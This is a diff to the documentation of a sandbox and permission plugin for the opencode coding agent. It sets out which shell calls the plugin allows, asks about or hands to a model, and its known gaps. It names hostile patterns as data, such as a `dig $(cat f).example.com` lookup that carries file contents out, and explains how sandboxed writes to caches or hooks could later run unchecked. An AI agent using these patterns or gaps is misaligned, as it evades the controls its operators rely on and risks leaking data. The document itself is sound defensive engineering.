@@ -89,7 +89,9 @@ For each shell tool call:
      such a command (`echo git init`) is not read as one.
      `curl` and `wget` pass only with options whose whole effect the check computes: a
      method other than GET or HEAD, `--url @file`, and options such as `-x`, `-nH`, `-r`
-     and `--proto-redir` ask; a file `curl` reads through a `file:` URL is held to the
+     and `--proto-redir` ask, and so does a `curl` URL of any scheme but http and https
+     (`telnet://` sends standard input; a host such as `ftp.x` picks a scheme too); a file
+     `curl` reads through a `file:` URL is held to the
      checks of a file read; a host or a query built at run time for a lookup tool
      (`dig $(cat f).example.com`) goes to the model.
    - **allow**: read-only commands, builds, tests, local git, edits inside the project
@@ -172,7 +174,14 @@ For each shell tool call:
      makefile from standard input, a device or a pipe, also through a symbolic link, and
      `NAME=value` arguments of make on the environment's terms; `fd -x`; `rg --pre`;
      `man -P`, `-H` and `-C`); builtins that evaluate a value as arithmetic (`let`,
-     `declare -i`, `test -v` with a subscript); a glob, or an unquoted expansion whose
+     `declare -i`, `test -v` with a subscript), and a value given in any of those ways to
+     one of bash's integer variables (`RANDOM`, `SRANDOM`, `OPTIND`, `HISTCMD`, `SECONDS`,
+     `BASHPID`, `BASH_XTRACEFD`, `READLINE_MARK`, `READLINE_POINT`); a locale (`LANG`,
+     `LC_*`) other than C, POSIX or UTF-8, whose charset can read a backslash as part of a
+     character (GBK, Big5, SJIS), set by the command or handed to its shell; `bun run` of
+     anything but a script of `package.json`, a file or a package's program, `bun run -` and
+     `bun -e`; and `export`, `declare`,
+     `typeset`, `readonly` or `local` of a name built at run time (`export "$x"`); a glob, or an unquoted expansion whose
      value the call does not set to plain text first (`ls $x`, `ls $(cmd)`), that matches a
      file whose name starts with `-` (`ls *` beside a file called `-rf`; a file named `-`
      alone does not count); a path with a part named like an option that is not there yet,
@@ -220,7 +229,20 @@ For each shell tool call:
      The moment a session began is kept across a restart of opencode, one small file per
      session in the state directory's `moments/`, removed thirty days after its last use.
      As a second line the plugin keeps what the session wrote, for the whole session,
-     approved commands and approved edits included: once the session has written a file
+     approved commands and approved edits included, in one record for every session of the
+     project (a subagent works in a session of its own). A write here is one of content: `touch`,
+     `mkdir` and a compressor's copy of a file already in the project (`gzip -k f`) are not
+     counted, since what they make is empty or comes from a file the record already judges.
+     A session an earlier opencode process
+     saw, or a call the model allowed, counts as having written anywhere in the project. A call
+     that writes, or an edit, asks while another allowed call that runs programs of the project
+     (anything off the safe list below, a git command that runs hooks, a `sed`, `awk` or `jq`
+     given a program file) may still be running, in the same message, in the background or in
+     another session: that call was judged before the write. The other way round too: a call
+     that runs programs of the project asks while an allowed write decided before it may not
+     have run yet, and one whose decision took time (the model, a push's dry run) asks if a
+     write was recorded meanwhile. Approved commands run outside the sandbox and hold no
+     write back: once the session has written a file
      anywhere in the project, every program goes to the model unless it is on a short safe
      list (shell syntax and builtins, text, file and archive tools, `curl` and `wget`, and
      git's commands that read, add, commit, switch or fetch, but not `pull`, `merge`
@@ -229,7 +251,18 @@ For each shell tool call:
      model, and the reason names the file; `ls`, `grep`, `git status` and `git commit` stay
      allows. That is about two everyday commands in five (141 of 364 after one edit). A name is on the list only as bash
      finds it: a builtin, or a file on `PATH` outside the project and the temp directories
-     (`/bin/cat`, `./cat` and a name the call defines a function under are not). A git
+     (`/bin/cat`, `./cat` and a name the call defines a function under are not). `less` is
+     on it only where `LESSOPEN` and `LESSCLOSE` are unset or name, by an absolute path, a
+     program outside every place a call can write (`| /usr/bin/lesspipe %s`), and with no
+     lesskey option (`-k`, `--lesskey-src`, `--lesskey-content`), and `tar`
+     only where `TAR_OPTIONS` is unset. Nothing is on it while opencode's environment has a
+     variable that names a program or a file a listed program loads (`GIT_EXTERNAL_DIFF`,
+     `GIT_SSH_COMMAND`, `EDITOR`, `PAGER`, `RIPGREP_CONFIG_PATH`, ...) with a path the session
+     can write, and a shell given such a value where opencode's own has none asks, as for
+     `PATH`; the loader's `LD_LIBRARY_PATH`, `LD_PRELOAD` and `LD_AUDIT` are read as `PATH` is
+     (an empty or relative entry counts), and with such an entry in `PATH` or such a variable
+     any program counts as running code of the project for the hold-back below. The plugin's
+     own git keeps only the entries of these, and of `GIT_EXEC_PATH`, that a call cannot write. A git
      command is on it only where the repository's own configuration, and every file it
      includes whatever the condition, holds no key that may name a program
      (`core.hooksPath` as husky sets it, `credential.helper`, `alias.*`, a URL whose scheme
@@ -293,6 +326,11 @@ For each shell tool call:
    whose stdin, stdout or stderr is a terminal (exit 126; opencode gives its shell none):
    - **Writes** only beneath the project's checkouts, `allowedPaths`, temp dirs,
      `sandboxWritable`, `/dev/null`, `/dev/zero`, `/dev/full` and a private `/dev/shm`.
+     The code caches in the temp directories (`node-compile-cache`, which tsc turns on
+     itself, `tsx-<uid>`, `jiti`, `v8-compile-cache-<uid>` and Jest's `jest_<uid>`, and a
+     `NODE_COMPILE_CACHE` in a writable place) are private and empty for each call, so nothing
+     a call writes there runs in a later node outside the sandbox; an edit there asks. Other tools' caches in the
+     temp directories are not covered (see Known gaps).
      Everything else is mounted read-only as well, so `chmod`, `touch -d` and `setxattr` fail
      there too. Terminals (`/dev/tty`, `/dev/ptmx`, `/dev/pts`) are not writable and no device
      opened inside the sandbox accepts an ioctl. **No build cache is writable by default**:
@@ -491,7 +529,8 @@ For each shell tool call:
    asks.
 
 The plugin records the project's git layout at session start, nested repositories and pointer
-files included, and checks it before every decision. A git directory is known by the device
+files included, and checks it before every decision and when each call is over; a change a
+call made pauses every session, and a session that starts while one is paused starts paused. A git directory is known by the device
 and inode of a descriptor the plugin holds open on it (one descriptor per git directory for
 the length of the session), so one moved away and replaced is noticed; a restart of opencode
 takes a fresh record of what is there then. Repositories outside the project (in
@@ -761,10 +800,16 @@ message), which is why pushes and ssh use deterministic rules instead.
   command or a git hook run later outside the sandbox. Hook managers are in this class: the
   known files are read-only (`.husky/`, lefthook, pre-commit, overcommit), but only where they
   already exist, and a hook that calls `npm run lint` or a script in the repository runs
-  whatever that has become. Read the diff before you run or commit. The other side of that
+  whatever that has become. Read the diff before you run or commit. What a hook writes when a
+  git command runs it is the hook's doing and is not in the record of what the session wrote. The other side of that
   protection: a git command that would rewrite one of those files (a `git switch` to a branch
   with another `.husky/pre-commit`) asks, and `git pull` asks in every repository that tracks
   one, or tracks `AGENTS.md`, `CLAUDE.md`, `opencode.json`, `.claude/` or `.agents/`.
+  opencode runs some project files itself, after an edit and outside the sandbox: with
+  `formatter` set in an opencode config, a formatter the project names (`./vendor/bin/pint`
+  for a `composer.json` that requires it, prettier and its config, `mix format` and
+  `.formatter.exs`), and with `lsp` set, the servers you name. Leave both unset where calls
+  are auto-allowed.
 - **Credentials are found by name.** A secret in a file the rules do not recognise is
   readable, and so is `.git/config` with a token in a remote URL, and a credential file that
   was committed to the repository: `git diff`, `git show` and `git log -p` read it from git's
@@ -859,11 +904,20 @@ message), which is why pushes and ssh use deterministic rules instead.
   `systemctl cat` print a unit's configuration, environment settings included.
 - **`/tmp` is shared.** It stays writable and shared with other processes, because agents and
   opencode's own tools pass files through it, and it is walked before every allowed command
-  (see the scan budget above). A repository there, or in a `sandboxWritable` directory, has
+  (see the scan budget above). A tool that keeps code it runs later in a temp directory under a
+  name the sandbox does not cover (see "Writes" above) runs what a sandboxed call left there. A repository there, or in a `sandboxWritable` directory, has
   its existing hooks and config made read-only; what cannot be protected in it (a missing
   include, a symbolic or hard link) is left, where the same thing in the project or an
   `allowedPaths` directory would make the command ask. Your global hooks directory is
   checked wherever it lies.
+- **The plugin's own `git status`** (to see what a git call changed) runs only in the
+  project's repositories, whose configuration every sandboxed call has read-only; a git call
+  that writes the work tree of a repository elsewhere (a temp directory) marks that work tree
+  whole.
+- **The plugin's own git** (its lookups, and the dry-run push with its ssh) runs with a `PATH`
+  without the entries a call can write (the project, `allowedPaths`, `sandboxWritable`, the
+  temp directories, relative ones): where the only `git` on `PATH` is in one of those (a
+  project-local toolchain), its lookups fail and the calls that need them ask.
 - **Calls running at the same time** are tracked within one opencode process. Two opencode
   processes on one checkout do not see each other's calls: a push one of them checked and a
   git-only call of the other do not hold each other back, and an approval in one opens no
